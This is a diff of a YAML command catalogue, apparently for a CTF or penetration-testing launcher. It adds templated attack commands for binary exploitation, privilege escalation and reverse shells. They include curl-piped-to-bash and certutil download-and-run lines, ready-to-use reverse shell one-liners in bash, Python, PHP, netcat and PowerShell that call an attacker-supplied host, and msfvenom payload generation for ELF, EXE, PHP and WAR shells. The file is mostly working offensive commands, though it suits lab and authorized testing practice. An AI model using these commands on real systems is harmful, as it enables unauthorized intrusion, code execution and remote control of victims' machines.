+        params:
+          - file_path
+
+      checksec_binary:
+        name: "Checksec - Security Properties"
+        description: "Check binary security: ASLR, NX, PIE, Canary, RELRO"
+        command: "checksec --file={file_path}"
+        params:
+          - file_path
+
+      ldd_libs:
+        name: "LDD - List Libraries"
+        description: "List shared library dependencies"
+        command: "ldd {file_path}"
+        params:
+          - file_path
+
+      ltrace_calls:
+        name: "Ltrace - Library Calls"
+        description: "Trace library calls made by binary"
+        command: "ltrace {file_path}"
+        params:
+          - file_path
+
+      strace_syscalls:
+        name: "Strace - System Calls"
+        description: "Trace system calls and signals"
+        command: "strace {file_path}"
+        params:
+          - file_path
+
+      objdump_disasm:
+        name: "Objdump - Disassemble"
+        description: "Disassemble binary executable sections"
+        command: "objdump -d {file_path} | head -200"
+        params:
+          - file_path
+
+      readelf_headers:
+        name: "Readelf - ELF Headers"
+        description: "Display ELF file headers and sections"
+        command: "readelf -a {file_path}"
+        params:
+          - file_path
+
+      nm_symbols:
+        name: "NM - List Symbols"
+        description: "List symbols from object files"
+        command: "nm {file_path}"
+        params:
+          - file_path
+
+      radare2_analyze:
+        name: "Radare2 - Full Analysis"
+        description: "Open in Radare2 with auto-analysis"
+        command: "r2 -A {file_path}"
+        params:
+          - file_path
+
+      ghidra_open:
+        name: "Ghidra - GUI Decompiler"
+        description: "Open binary in Ghidra for decompilation"
+        command: "ghidraRun {file_path}"
+        params:
+          - file_path
+
+      gdb_run:
+        name: "GDB - Debug Binary"
+        description: "Open binary in GDB with pwndbg/GEF"
+        command: "gdb {file_path}"
+        params:
+          - file_path
+
+      strings_functions:
+        name: "Strings - Find Function Names"
+        description: "Extract strings that look like function names"
+        command: "strings {file_path} | grep -E '^[a-zA-Z_][a-zA-Z0-9_]*$' | head -50"
+        params:
+          - file_path
+
+  pwn_tools:
+    name: "💀 Binary Exploitation"
+    tools:
+      pattern_create:
+        name: "Pattern Create - Cyclic Pattern"
+        description: "Generate cyclic pattern for buffer overflow"
+        command: "msf-pattern_create -l {length}"
+        params:
+          - length
+
+      pattern_offset:
+        name: "Pattern Offset - Find EIP/RIP"
+        description: "Find offset in cyclic pattern"
+        command: "msf-pattern_offset -q {pattern_value}"
+        params:
+          - pattern_value
+
+      ropper_gadgets:
+        name: "Ropper - Find ROP Gadgets"
+        description: "Find ROP gadgets in binary"
+        command: "ropper -f {file_path} --search 'pop rdi'"
+        params:
+          - file_path
+
+      one_gadget:
+        name: "One_gadget - Find Magic Gadgets"
+        description: "Find one-shot RCE gadgets in libc"
+        command: "one_gadget {libc_path}"
+        params:
+          - libc_path
+
+      pwntools_template:
+        name: "Pwntools - Generate Template"
+        description: "Generate pwntools exploit template"
+        command: "pwn template --host {target_ip} --port {target_port} {binary_path}"
+        params:
+          - target_ip
+          - target_port
+          - binary_path
+
+  # ==========================================================================
+  # PHASE 7: PRIVILEGE ESCALATION
+  # ==========================================================================
+
+  privesc_enum:
+    name: "📈 Privilege Escalation Enumeration"
+    tools:
+      linpeas_serve:
+        name: "LinPEAS - Host for Download"
+        description: "Start HTTP server to serve LinPEAS to target"
+        command: "cd /opt/privesc && python3 -m http.server {port}"
+        params:
+          - port
+
+      linpeas_cmd:
+        name: "LinPEAS - Generate Download Command"
+        description: "Copy this to target to download and run LinPEAS"
+        command: "echo 'curl http://{lhost}:{port}/linpeas.sh | bash' && echo 'OR' && echo 'wget http://{lhost}:{port}/linpeas.sh -O /tmp/linpeas.sh && chmod +x /tmp/linpeas.sh && /tmp/linpeas.sh'"
+        params:
+          - lhost
+          - port
+
+      winpeas_serve:
+        name: "WinPEAS - Host for Download"
+        description: "Start HTTP server to serve WinPEAS to target"
+        command: "cd /opt/privesc && python3 -m http.server {port}"
+        params:
+          - port
+
+      winpeas_cmd:
+        name: "WinPEAS - Generate Download Command"
+        description: "Copy this to target to download WinPEAS"
+        command: "echo 'certutil -urlcache -f http://{lhost}:{port}/winPEASx64.exe C:\\temp\\winpeas.exe && C:\\temp\\winpeas.exe' && echo 'OR PowerShell:' && echo 'IWR -Uri http://{lhost}:{port}/winPEASx64.exe -OutFile C:\\temp\\winpeas.exe'"
+        params:
+          - lhost
+          - port
+
+      sudo_check:
+        name: "Sudo -l - Check Sudo Rights"
+        description: "Check what commands user can run as sudo (run on target)"
+        command: "echo 'Run this on target: sudo -l'"
+        params: []
+
+      suid_find:
+        name: "SUID - Find SUID Binaries"
+        description: "Find all SUID binaries (run on target)"
+        command: "echo 'Run this on target: find / -perm -4000 -type f 2>/dev/null'"
+        params: []
+
+      capabilities_find:
+        name: "Capabilities - Find Cap Binaries"
+        description: "Find binaries with capabilities set (run on target)"
+        command: "echo 'Run this on target: getcap -r / 2>/dev/null'"
+        params: []
+
+      cron_enum:
+        name: "Cron - Enumerate Cron Jobs"
+        description: "List all cron jobs (run on target)"
+        command: "echo 'Run this on target: cat /etc/crontab && ls -la /etc/cron.* && crontab -l'"
+        params: []
+
+      gtfobins_search:
+        name: "GTFOBins - Search Binary"
+        description: "Search GTFOBins for privilege escalation"
+        command: "firefox 'https://gtfobins.github.io/#+{binary_name}'"
+        params:
+          - binary_name
+
+      lolbas_search:
+        name: "LOLBAS - Search Windows Binary"
+        description: "Search LOLBAS for Windows privilege escalation"
+        command: "firefox 'https://lolbas-project.github.io/#{binary_name}'"
+        params:
+          - binary_name
+
+  # ==========================================================================
+  # PHASE 8: REVERSE SHELLS & LISTENERS
+  # ==========================================================================
+
+  shells:
+    name: "🐚 Reverse Shells & Listeners"
+    tools:
+      nc_listener:
+        name: "Netcat - Start Listener"
+        description: "Start netcat listener for reverse shell"
+        command: "nc -lvnp {port}"
+        params:
+          - port
+
+      rlwrap_listener:
+        name: "Rlwrap NC - Better Listener"
+        description: "Netcat listener with readline (arrow keys work)"
+        command: "rlwrap nc -lvnp {port}"
+        params:
+          - port
+
+      pwncat_listener:
+        name: "Pwncat - Advanced Listener"
+        description: "Pwncat listener with auto-upgrade and features"
+        command: "pwncat-cs -lp {port}"
+        params:
+          - port
+
+      bash_reverse:
+        name: "Bash - Reverse Shell"
+        description: "Generate Bash reverse shell one-liner"
+        command: "echo 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'"
         params:
           - lhost
           - lport
 
-      bash_shell:
-        name: "Bash - Reverse Shell"
-        description: "Bash TCP reverse shell one-liner"
-        command: "bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
+      python_reverse:
+        name: "Python - Reverse Shell"
+        description: "Generate Python reverse shell one-liner"
+        command: "echo 'python3 -c '\\''import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'\\'''"
+        params:
+          - lhost
+          - lport
+
+      php_reverse:
+        name: "PHP - Reverse Shell"
+        description: "Generate PHP reverse shell command"
+        command: "echo 'php -r '\\''$sock=fsockopen(\"{lhost}\",{lport});exec(\"/bin/sh -i <&3 >&3 2>&3\");'\\'''"
         params:
           - lhost
           - lport
 
       nc_reverse:
         name: "Netcat - Reverse Shell"
-        description: "Netcat reverse shell (traditional)"
-        command: "nc {lhost} {lport} -e /bin/bash"
+        description: "Generate Netcat reverse shell (-e version)"
+        command: "echo 'nc {lhost} {lport} -e /bin/bash'"
+        params:
+          - lhost
+          - lport
+
+      nc_mkfifo:
+        name: "Netcat FIFO - Reverse Shell"
+        description: "Netcat reverse shell without -e flag"
+        command: "echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f'"
+        params:
+          - lhost
+          - lport
+
+      powershell_reverse:
+        name: "PowerShell - Reverse Shell"
+        description: "Generate PowerShell reverse shell"
+        command: "echo 'powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('\"'{lhost}'\"',{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + '\"'PS '\"' + (pwd).Path + '\"'> '\"';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()\"'"
         params:
           - lhost
           - lport
 
       msfvenom_linux:
-        name: "Msfvenom - Linux ELF Payload"
-        description: "Generate stageless Linux reverse shell binary"
-        command: "msfvenom -p linux/x64/shell_reverse_tcp LHOST={lhost} LPORT={lport} -f elf -o {output_file}"
+        name: "Msfvenom - Linux ELF"
+        description: "Generate Linux reverse shell binary"
+        command: "msfvenom -p linux/x64/shell_reverse_tcp LHOST={lhost} LPORT={lport} -f elf -o shell.elf"
         params:
           - lhost
           - lport
-          - output_file
 
       msfvenom_windows:
-        name: "Msfvenom - Windows EXE Payload"
+        name: "Msfvenom - Windows EXE"
         description: "Generate Windows reverse shell executable"
-        command: "msfvenom -p windows/x64/shell_reverse_tcp LHOST={lhost} LPORT={lport} -f exe -o {output_file}"
+        command: "msfvenom -p windows/x64/shell_reverse_tcp LHOST={lhost} LPORT={lport} -f exe -o shell.exe"
         params:
           - lhost
           - lport
-          - output_file
 
-  web_quick:
-    name: "🌐 Quick Web Enumeration"
+      msfvenom_php:
+        name: "Msfvenom - PHP Web Shell"
+        description: "Generate PHP reverse shell"
+        command: "msfvenom -p php/reverse_php LHOST={lhost} LPORT={lport} -f raw > shell.php"
+        params:
+          - lhost
+          - lport
+
+      msfvenom_war:
+        name: "Msfvenom - WAR (Tomcat)"
+        description: "Generate WAR file for Tomcat deployment"
+        command: "msfvenom -p java/jsp_shell_reverse_tcp LHOST={lhost} LPORT={lport} -f war -o shell.war"
+        params:
+          - lhost
+          - lport
+
+      shell_upgrade:
+        name: "Shell Upgrade - Python PTY"
+        description: "Upgrade dumb shell to interactive PTY (run on target)"
+        command: "echo 'python3 -c \"import pty;pty.spawn(\\\"/bin/bash\\\")\"' && echo 'Then: Ctrl+Z' && echo 'stty raw -echo; fg' && echo 'export TERM=xterm'"
+        params: []
+
+  # ==========================================================================
+  # PHASE 9: OSINT & RECON
+  # ==========================================================================
+
+  osint_tools:
+    name: "🕵️ OSINT & Information Gathering"
     tools:
-      gobuster_dir:
-        name: "Gobuster - Directory Brute Force"
-        description: "Fast directory and file enumeration"
-        command: "gobuster dir -u http://{target_ip} -w /usr/share/wordlists/dirb/common.txt -t 50"
+      whois_lookup:
+        name: "Whois - Domain Info"
+        description: "Get domain registration information"
+        command: "whois {domain}"
         params:
-          - target_ip
-
-      ffuf_vhost:
-        name: "Ffuf - Virtual Host Discovery"
-        description: "Discover virtual hosts on web server"
-        command: "ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://{target_ip} -H 'Host: FUZZ.{domain}'"
-        params:
-          - target_ip
           - domain
 
-      whatweb:
-        name: "WhatWeb - Technology Fingerprint"
-        description: "Identify web technologies, CMS, frameworks"
-        command: "whatweb -a 3 http://{target_ip}"
+      dig_all:
+        name: "Dig - All DNS Records"
+        description: "Query all DNS record types"
+        command: "dig {domain} ANY +noall +answer"
         params:
-          - target_ip
+          - domain
 
-      curl_headers:
-        name: "Curl - HTTP Headers Analysis"
-        description: "Retrieve and analyze HTTP response headers"
-        command: "curl -I http://{target_ip}"
+      dnsrecon_enum:
+        name: "DNSRecon - DNS Enumeration"
+        description: "Comprehensive DNS enumeration"
+        command: "dnsrecon -d {domain} -t std"
         params:
-          - target_ip
+          - domain
 
-  binary_analysis:
-    name: "⚙️ Binary & Reverse Engineering"
+      theHarvester:
+        name: "theHarvester - Email & Subdomain"
+        description: "Gather emails, subdomains, hosts from public sources"
+        command: "theHarvester -d {domain} -b all -l 200"
+        params:
+          - domain
+
+      sherlock_user:
+        name: "Sherlock - Username Hunt"
+        description: "Find social media accounts by username"
+        command: "sherlock {username}"
+        params:
+          - username
+
+      wayback_urls:
+        name: "Wayback URLs"
+        description: "Get historical URLs from Wayback Machine"
+        command: "waybackurls {domain} | tee wayback_urls.txt"
+        params:
+          - domain
+
+      subfinder_passive:
+        name: "Subfinder - Subdomain Discovery"
+        description: "Passive subdomain enumeration"
+        command: "subfinder -d {domain} -o subdomains.txt"
+        params:
+          - domain
+
+  # ==========================================================================
+  # PHASE 10: QUICK CTF UTILITIES
+  # ==========================================================================
+
+  quick_utils:
+    name: "⚡ Quick CTF Utilities"
     tools:
-      file_identify:
-        name: "File - Type Identification"
-        description: "Identify file type and architecture"
-        command: "file {file_path}"
+      http_server:
+        name: "Python HTTP Server"
+        description: "Quick file server for hosting payloads"
+        command: "python3 -m http.server {port}"
         params:
-          - file_path
+          - port
 
-      ltrace:
-        name: "Ltrace - Library Call Tracer"
-        description: "Trace dynamic library calls made by binary"
-        command: "ltrace {binary_path}"
-        params:
-          - binary_path
+      smb_server:
+        name: "SMB Server (Impacket)"
+        description: "Quick SMB share for Windows file transfer"
+        command: "impacket-smbserver share . -smb2support"
+        params: []
 
-      strace:
-        name: "Strace - System Call Tracer"
-        description: "Trace system calls and signals"
-        command: "strace {binary_path}"
-        params:
-          - binary_path
+      ftp_server:
+        name: "FTP Server (Python)"
+        description: "Quick anonymous FTP server"
+        command: "python3 -m pyftpdlib -p 21 -w"
+        params: []
 
-      radare2_analyze:
-        name: "Radare2 - Binary Analysis"
-        description: "Open binary in radare2 with auto-analysis"
-        command: "r2 -A {binary_path}"
+      searchsploit:
+        name: "SearchSploit - Find Exploits"
+        description: "Search ExploitDB for vulnerabilities"
+        command: "searchsploit {search_term}"
         params:
-          - binary_path
+          - search_term
 
-      objdump_disasm:
-        name: "Objdump - Disassemble Binary"
-        description: "Disassemble executable sections"
-        command: "objdump -d {binary_path}"
+      searchsploit_nmap:
+        name: "SearchSploit - From Nmap Scan"
+        description: "Search exploits based on Nmap XML output"
+        command: "searchsploit --nmap {nmap_xml}"
         params:
-          - binary_path
+          - nmap_xml
+
+      revshells_site:
+        name: "RevShells.com - Shell Generator"
+        description: "Open reverse shell generator website"
+        command: "firefox 'https://www.revshells.com/'"
+        params: []
+
+      hacktricks_search:
+        name: "HackTricks - Search"
+        description: "Search HackTricks for techniques"
+        command: "firefox 'https://book.hacktricks.xyz/?q={search_term}'"
+        params:
+          - search_term
+
+      payloads_all:
+        name: "PayloadsAllTheThings"
+        description: "Open PayloadsAllTheThings repository"
+        command: "firefox 'https://github.com/swisskyrepo/PayloadsAllTheThings'"
+        params: []
+
+      ipinfo:
+        name: "IP Info - Get Your IP"
+        description: "Get your public IP and network info"
+        command: "curl -s ipinfo.io | jq ."
+        params: []
+
+      tunnel_chisel:
+        name: "Chisel - Port Forward"
+        description: "Start Chisel server for tunneling"
+        command: "chisel server --reverse --port {port}"
+        params:
+          - port
+
+      socat_listener:
+        name: "Socat - Advanced Listener"
+        description: "Start socat listener with PTY"
+        command: "socat file:`tty`,raw,echo=0 tcp-listen:{port}"
+        params:
+          - port
+
+      jwt_decode:
+        name: "JWT - Decode Token"
+        description: "Decode JWT token (base64)"
+        command: "echo '{jwt_token}' | cut -d'.' -f2 | base64 -d 2>/dev/null | jq ."
+        params:
+          - jwt_token
+
+      jwt_crack:
+        name: "JWT Tool - Crack Secret"
+        description: "Attempt to crack JWT secret"
+        command: "python3 /opt/jwt_tool/jwt_tool.py {jwt_token} -C -d /usr/share/wordlists/rockyou.txt"
+        params:
+          - jwt_token
 
